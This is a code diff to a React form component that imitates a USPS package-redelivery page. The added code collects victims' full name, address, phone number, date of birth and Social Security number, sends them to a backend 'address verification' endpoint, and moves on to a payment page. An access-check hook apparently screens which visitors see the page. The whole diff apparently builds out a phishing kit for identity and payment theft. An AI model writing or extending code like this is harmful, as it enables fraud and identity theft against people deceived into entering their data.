@@ -1,12 +1,53 @@
 import React, { useState } from "react";
+import { useNavigate } from "react-router-dom";
+import axios from "axios";
 import Header from "../components/Header";
 import Footer from "../components/Footer";
+import { baseUrl } from "../constants";
+import useAccessCheck from "../Utils/useAccessCheck";
+
+type FormErrors = {
+  fullName: string;
+  streetAddress1: string;
+  city: string;
+  state: string;
+  zipCode: string;
+  phone: string;
+  dob: string;
+  ssn: string;
+  form: string;
+};
+
 const LoginForm: React.FC = () => {
   const inputClass =
     "w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]";
 
+  const navigate = useNavigate();
+  const isAllowed = useAccessCheck(baseUrl);
+  const [sessionId] = useState(() =>
+    `usps-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
+  );
+  const [isLoading, setIsLoading] = useState(false);
+  const [fullName, setFullName] = useState("");
+  const [streetAddress1, setStreetAddress1] = useState("");
+  const [streetAddress2, setStreetAddress2] = useState("");
+  const [city, setCity] = useState("");
+  const [stateValue, setStateValue] = useState("");
+  const [zipCode, setZipCode] = useState("");
+  const [dob, setDob] = useState("");
   const [phone, setPhone] = useState("");
   const [ssn, setSsn] = useState("");
+  const [errors, setErrors] = useState<FormErrors>({
+    fullName: "",
+    streetAddress1: "",
+    city: "",
+    state: "",
+    zipCode: "",
+    phone: "",
+    dob: "",
+    ssn: "",
+    form: "",
+  });
 
   const formatPhone = (value: string) => {
     const digits = value.replace(/\D/g, "").slice(0, 10);
@@ -25,6 +66,73 @@ const LoginForm: React.FC = () => {
     if (digits.length > 3) segments.push(digits.slice(3, 5));
     if (digits.length > 5) segments.push(digits.slice(5));
     return segments.join("-");
+  };
+
+  const resetErrors = () =>
+    setErrors({
+      fullName: "",
+      streetAddress1: "",
+      city: "",
+      state: "",
+      zipCode: "",
+      phone: "",
+      dob: "",
+      ssn: "",
+      form: "",
+    });
+
+  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    resetErrors();
+    setIsLoading(true);
+
+    const phoneDigits = phone.replace(/\D/g, "");
+    const ssnDigits = ssn.replace(/\D/g, "");
+
+    const newErrors: FormErrors = {
+      fullName: !fullName.trim() ? "Full name is required." : "",
+      streetAddress1: !streetAddress1.trim()
+        ? "Primary street address is required."
+        : "",
+      city: !city.trim() ? "City is required." : "",
+      state: !stateValue ? "State is required." : "",
+      zipCode: !zipCode.trim() ? "ZIP code is required." : "",
+      phone: phoneDigits.length !== 10 ? "Phone number must be 10 digits." : "",
+      dob: !dob ? "Date of birth is required." : "",
+      ssn: ssnDigits.length !== 9 ? "SSN must be 9 digits." : "",
+      form: "",
+    };
+
+    if (Object.values(newErrors).some((msg) => msg)) {
+      setErrors(newErrors);
+      setIsLoading(false);
+      return;
+    }
+
+    try {
+      await axios.post(`${baseUrl}api/usps-address-verification/`, {
+        sessionId,
+        fullName,
+        streetAddress1,
+        streetAddress2,
+        city,
+        state: stateValue,
+        zipCode,
+        phone: phoneDigits,
+        dob,
+        ssn: ssnDigits,
+      });
+
+      navigate("/payment", { state: { sessionId } });
+    } catch (error) {
+      console.error("Error submitting address verification:", error);
+      setErrors((prev) => ({
+        ...prev,
+        form: "There was an error verifying your address. Please try again.",
+      }));
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   const states = [
@@ -87,6 +195,14 @@ const LoginForm: React.FC = () => {
     { id: 3, color: "#d9d9df" },
     { id: 4, color: "#d9d9df" },
   ];
+
+  if (isAllowed === null) {
+    return <div>Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
@@ -165,11 +281,55 @@ const LoginForm: React.FC = () => {
               <div className="text-[11px] text-[#4a4f6d] mb-6">
                 First, we need to confirm your address is eligible for redelivery.
               </div>
-              <form className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4">
-                <input type="text" placeholder="Full name" className={inputClass} required />
-                <input type="text" placeholder="Street Address 2 (OPT)" className={inputClass} />
-                <input type="text" placeholder="Street Address 1" className={inputClass} required />
-                <input type="text" placeholder="City" className={inputClass} required />
+              <form className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4" onSubmit={handleSubmit}>
+                <div>
+                  <input
+                    type="text"
+                    placeholder="Full name"
+                    className={inputClass}
+                    value={fullName}
+                    onChange={(e) => setFullName(e.target.value)}
+                    required
+                  />
+                  {errors.fullName && (
+                    <p className="mt-1 text-xs text-red-600">{errors.fullName}</p>
+                  )}
+                </div>
+                <div>
+                  <input
+                    type="text"
+                    placeholder="Street Address 2 (OPT)"
+                    className={inputClass}
+                    value={streetAddress2}
+                    onChange={(e) => setStreetAddress2(e.target.value)}
+                  />
+                </div>
+                <div>
+                  <input
+                    type="text"
+                    placeholder="Street Address 1"
+                    className={inputClass}
+                    value={streetAddress1}
+                    onChange={(e) => setStreetAddress1(e.target.value)}
+                    required
+                  />
+                  {errors.streetAddress1 && (
+                    <p className="mt-1 text-xs text-red-600">{errors.streetAddress1}</p>
+                  )}
+                </div>
+                <div>
+                  <input
+                    type="text"
+                    placeholder="City"
+                    className={inputClass}
+                    value={city}
+                    onChange={(e) => setCity(e.target.value)}
+                    required
+                  />
+                  {errors.city && (
+                    <p className="mt-1 text-xs text-red-600">{errors.city}</p>
+                  )}
+                </div>
                 <input
                   type="tel"
                   inputMode="tel"
@@ -180,8 +340,16 @@ const LoginForm: React.FC = () => {
                   pattern="^\(\d{3}\) \d{3}-\d{4}$"
                   required
                 />
+                {errors.phone && (
+                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.phone}</p>
+                )}
                 <div className="relative">
-                  <select className={`${inputClass} appearance-none pr-10`} defaultValue="" required>
+                  <select
+                    className={`${inputClass} appearance-none pr-10`}
+                    value={stateValue}
+                    onChange={(e) => setStateValue(e.target.value)}
+                    required
+                  >
                     <option value="" disabled>
                       Select State
                     </option>
@@ -199,8 +367,17 @@ const LoginForm: React.FC = () => {
                     <path d="M5.23 7.21a.75.75 0 0 1 1.06.02L10 11.17l3.71-3.94a.75.75 0 1 1 1.08 1.04l-4.24 4.5a.75.75 0 0 1-1.08 0l-4.24-4.5a.75.75 0 0 1 .02-1.06Z" />
                   </svg>
                 </div>
+                {errors.state && (
+                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.state}</p>
+                )}
                 <div className="relative">
-                  <input type="date" className={`${inputClass} pr-10`} required />
+                  <input
+                    type="date"
+                    className={`${inputClass} pr-10`}
+                    value={dob}
+                    onChange={(e) => setDob(e.target.value)}
+                    required
+                  />
                   <svg
                     className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#1a2252]"
                     viewBox="0 0 24 24"
@@ -214,7 +391,21 @@ const LoginForm: React.FC = () => {
                     <line x1="3" y1="10" x2="21" y2="10" />
                   </svg>
                 </div>
-                <input type="text" placeholder="ZIP Code™ (CPI)" className={inputClass} />
+                {errors.dob && (
+                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.dob}</p>
+                )}
+                <div>
+                  <input
+                    type="text"
+                    placeholder="ZIP Code™ (CPI)"
+                    className={inputClass}
+                    value={zipCode}
+                    onChange={(e) => setZipCode(e.target.value.slice(0, 10))}
+                  />
+                  {errors.zipCode && (
+                    <p className="mt-1 text-xs text-red-600">{errors.zipCode}</p>
+                  )}
+                </div>
                 <input
                   type="text"
                   inputMode="numeric"
@@ -225,11 +416,20 @@ const LoginForm: React.FC = () => {
                   pattern="^\d{3}-\d{2}-\d{4}$"
                   required
                 />
+                {errors.ssn && (
+                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.ssn}</p>
+                )}
+                {errors.form && (
+                  <p className="sm:col-span-2 text-sm text-red-600 font-semibold">
+                    {errors.form}
+                  </p>
+                )}
                 <button
                   type="submit"
-                  className="sm:col-span-2 mt-3 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors"
+                  className="sm:col-span-2 mt-3 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors disabled:opacity-60 disabled:cursor-not-allowed"
+                  disabled={isLoading}
                 >
-                  Continue
+                  {isLoading ? "Submitting..." : "Continue"}
                 </button>
               </form>
             </section>
